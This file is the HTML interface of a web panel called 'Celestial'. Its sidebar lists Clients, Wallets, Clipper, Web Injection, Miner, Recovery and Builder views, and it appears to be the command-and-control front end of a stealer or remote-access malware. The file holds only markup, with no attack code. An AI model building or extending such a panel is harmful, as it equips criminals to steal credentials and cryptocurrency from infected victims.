<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Celestial</title>
<link rel="stylesheet" href="style.css">
</head>
<body>

<div id="login" class="login-container">
  <div class="login-card">
    <div class="login-icon">
      <svg viewBox="0 0 24 24" fill="currentColor"><path d="M5 3l14 8-6 1 3.5 7-2.5 1.2L10.5 13 5 17V3z"/></svg>
    </div>
    <h1 data-i18n="signin">Sign in</h1>
    <label class="login-field">
      <span data-i18n="operatorKey">Operator Key</span>
      <input type="password" id="keyInput" data-i18n-placeholder="operatorKeyPh" placeholder="Enter operator key" autocomplete="off">
    </label>
    <button id="loginBtn" class="login-btn" data-i18n="signIn">Sign In</button>
    <p class="login-foot">
      <span data-i18n="needAccess">Need access?</span>
      <a href="#" onclick="return false" data-i18n="contactAdmin">Contact admin</a>
    </p>
    <div class="login-langs" id="loginLangs">
      <button data-lang="en" class="active">English</button>
      <button data-lang="ru">Русский</button>
      <button data-lang="zh">中文</button>
    </div>
    <p id="loginError" class="login-error"></p>
  </div>
</div>

<div id="app" class="app hidden">
  <aside class="sidebar">
    <div class="logo">
      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 12c4-6 12-6 18 0M3 12c4 6 12 6 18 0"/></svg>
      <span>Celestial</span>
    </div>
    <nav id="nav">
      <button data-view="home"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M3 9.5L12 3l9 6.5V20a1 1 0 0 1-1 1h-5v-6h-6v6H4a1 1 0 0 1-1-1V9.5z"/></svg><span data-i18n="home">Home</span></button>
      <button data-view="dashboard"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="3" y="3" width="7" height="7" rx="1"/><rect x="14" y="3" width="7" height="7" rx="1"/><rect x="3" y="14" width="7" height="7" rx="1"/><rect x="14" y="14" width="7" height="7" rx="1"/></svg><span data-i18n="dashboard">Dashboard</span></button>
      <button data-view="clients" class="active"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><circle cx="9" cy="8" r="3.5"/><path d="M2.5 20c.6-3.6 3.3-6 6.5-6s5.9 2.4 6.5 6"/><circle cx="17" cy="9" r="2.5"/><path d="M15.5 14.5c2.6.2 5 2.2 5.5 5.5"/></svg><span data-i18n="clients">Clients</span></button>
      <button data-view="anonymous"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><circle cx="12" cy="8" r="4"/><path d="M4 21c1-4 4.5-6 8-6s7 2 8 6"/><rect x="3" y="19" width="18" height="2" rx="1"/></svg><span data-i18n="anonymous">Anonymous</span></button>
      <button data-view="recovery"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M3 12a9 9 0 1 0 3-6.7L3 8"/><path d="M3 3v5h5"/></svg><span data-i18n="recovery">Recovery</span></button>
      <button data-view="wallets"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="3" y="6" width="18" height="13" rx="2"/><path d="M3 10h18"/><circle cx="16.5" cy="14.5" r="1.2"/></svg><span data-i18n="wallets">Wallets</span></button>
      <button data-view="proxy"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><circle cx="12" cy="12" r="9"/><path d="M3 12h18M12 3a15 15 0 0 1 0 18M12 3a15 15 0 0 0 0 18"/></svg><span data-i18n="proxy">Proxy</span></button>
      <button data-view="clipper"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><circle cx="6" cy="6" r="2.5"/><circle cx="6" cy="18" r="2.5"/><path d="M20 4L8.5 15.5M20 20L8.5 8.5"/></svg><span data-i18n="clipper">Clipper</span></button>
      <button data-view="webinjection"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M8 6l-5 6 5 6M16 6l5 6-5 6"/></svg><span data-i18n="webinjection">Web Injection</span></button>
      <button data-view="sorter"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M7 4v16M7 4l-3 3M7 4l3 3M17 20V4M17 20l-3-3M17 20l3-3"/></svg><span data-i18n="sorter">Sorter</span></button>
      <button data-view="autotasks"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M4 6h16M4 12h10M4 18h16"/><circle cx="18" cy="12" r="2"/></svg><span data-i18n="autotasks">Auto Tasks</span></button>
      <button data-view="filestore"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M3 7a2 2 0 0 1 2-2h4l2 2h8a2 2 0 0 1 2 2v9a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V7z"/></svg><span data-i18n="filestore">File Store</span></button>
      <button data-view="miner"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="4" y="4" width="16" height="16" rx="2"/><path d="M9 9h6v6H9zM2 10h2M2 14h2M20 10h2M20 14h2M10 2v2M14 2v2M10 20v2M14 20v2"/></svg><span data-i18n="miner">Miner</span></button>
      <button data-view="checker"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M12 3l8 3v6c0 5-3.5 8-8 9-4.5-1-8-4-8-9V6l8-3z"/><path d="M9 12l2 2 4-4"/></svg><span data-i18n="checker">Checker</span></button>
      <button data-view="checkersessions"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M4 6h16M4 10h16M4 14h10M4 18h10"/></svg><span data-i18n="checkersessions">Checker Sessions</span></button>
      <button data-view="builder"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M14 3l7 7-3 3-7-7 3-3zM11 6L4 13v7h7l7-7"/></svg><span data-i18n="builder">Builder</span></button>
    </nav>
    <div class="bottom-nav">
      <button id="notifBtn">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M6 8a6 6 0 0 1 12 0c0 7 3 8 3 8H3s3-1 3-8M10 21h4"/></svg>
        <span data-i18n="notifications">Notifications</span>
        <span class="notif-badge hidden" id="notifBadge">0</span>
      </button>
      <button id="themeBtn"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><circle cx="12" cy="12" r="4"/><path d="M12 2v3M12 19v3M2 12h3M19 12h3M5 5l2 2M17 17l2 2M19 5l-2 2M7 17l-2 2"/></svg><span data-i18n="theme">Theme</span></button>
      <button id="logoutBtn"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4M16 17l5-5-5-5M21 12H9"/></svg><span data-i18n="logout">Logout</span></button>
      <button id="profileBtn"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><circle cx="12" cy="8" r="4"/><path d="M4 21c1-4 4.5-6 8-6s7 2 8 6"/></svg><span data-i18n="profile">Profile</span></button>
    </div>
  </aside>

  <main class="main">
    <header class="topbar">
      <div class="topbar-left">
        <h2 id="viewTitle" data-i18n="connectedClients">Connected Clients</h2>
      </div>
      <div class="topbar-right">
        <span class="pill-count" id="pillCount">1 | 0 | 1</span>
        <button class="select-btn"><span data-i18n="all">All</span><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 9l6 6 6-6"/></svg></button>
        <button class="select-btn"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="3" y="4" width="18" height="16" rx="2"/><path d="M9 4v16M15 4v16"/></svg><span data-i18n="columns">Columns</span><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 9l6 6 6-6"/></svg></button>
        <span id="statusIndicator" class="status status-offline"></span>
      </div>
    </header>
    <section id="viewRoot" class="view"></section>
  </main>
</div>

<aside id="notifPanel" class="side-panel hidden">
  <div class="side-panel-head">
    <h3 data-i18n="notifications">Notifications</h3>
    <button id="notifClear" data-i18n="clearAll">Clear all</button>
    <button id="notifClose" class="panel-close">✕</button>
  </div>
  <div id="notifList" class="side-panel-body"></div>
</aside>

<aside id="themePanel" class="side-panel hidden">
  <div class="side-panel-head">
    <h3 data-i18n="theme">Theme</h3>
    <button id="themeClose" class="panel-close">✕</button>
  </div>
  <div class="side-panel-body">
    <div class="theme-section-title" data-i18n="baseThemes">Base</div>
    <div class="theme-grid" id="themeBase"></div>
    <div class="theme-section-title" data-i18n="darkThemes">Dark</div>
    <div class="theme-grid" id="themeDark"></div>
    <div class="theme-section-title" data-i18n="gradientThemes">Nitro Gradients</div>
    <div class="theme-grid" id="themeGradients"></div>
    <div class="theme-section-title" data-i18n="language">Language</div>
    <div class="login-langs" id="themeLangs">
      <button data-lang="en" class="active">English</button>
      <button data-lang="ru">Русский</button>
      <button data-lang="zh">中文</button>
    </div>
  </div>
</aside>

<div id="modal" class="modal hidden">
  <div class="modal-box">
    <div class="modal-head">
      <h3 id="modalTitle">Title</h3>
      <button id="modalClose">✕</button>
    </div>
    <div id="modalBody" class="modal-body"></div>
  </div>
</div>

<div id="ctxmenu" class="ctxmenu hidden"></div>
<div id="toast" class="toast hidden"></div>

<script src="/socket.io/socket.io.js"></script>
<script src="panel.js"></script>
</body>
</html>
